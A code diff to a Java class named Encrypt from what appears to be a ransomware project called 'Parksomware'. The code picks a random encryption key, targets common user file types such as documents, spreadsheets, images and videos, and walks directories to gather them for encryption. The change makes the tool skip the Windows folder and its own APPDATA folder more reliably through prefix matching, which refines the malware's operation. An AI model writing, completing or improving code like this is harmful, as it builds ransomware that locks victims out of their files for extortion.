@@ -12,8 +12,10 @@ public class Encrypt {
 
     private static final String KEY = UUID.randomUUID().toString().replaceAll("-", "");
     private static final String[] EXTENSIONS = new String[]{".doc", ".docx", ".pdf", ".txt", ".ppt", ".pptx", ".xls", ".xlsx", ".csv", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg", ".mp4", ".avi", ".mov", ".wmv", ".flv", ".swf", ".mkv"};
-    private static final String WINDOWS_FOLDER = "C:\\Windows";
-    private static final String PARKSOMWARE_FOLDER = System.getenv("APPDATA") + "\\Parksomware";
+    private static final String[] EXCLUDED_FOLDERS = new String[]{
+            "C:\\Windows",
+            System.getenv("APPDATA") + "\\Parksomware"
+    };
 
     public static void runEncryption() throws Exception {
         List<File> filesToEncrypt = new ArrayList<>();
@@ -44,9 +46,12 @@ public class Encrypt {
     }
 
     private static void collectFiles(File directory, List<File> files) {
-        if (directory.getAbsolutePath().equalsIgnoreCase(WINDOWS_FOLDER) ||
-                directory.getAbsolutePath().equalsIgnoreCase(PARKSOMWARE_FOLDER)) {
-            return;
+        String dirPath = directory.getAbsolutePath().toLowerCase();
+
+        for (String excludedFolder : EXCLUDED_FOLDERS) {
+            if (dirPath.startsWith(excludedFolder.toLowerCase())) {
+                return;
+            }
         }
 
         File[] found = directory.listFiles();
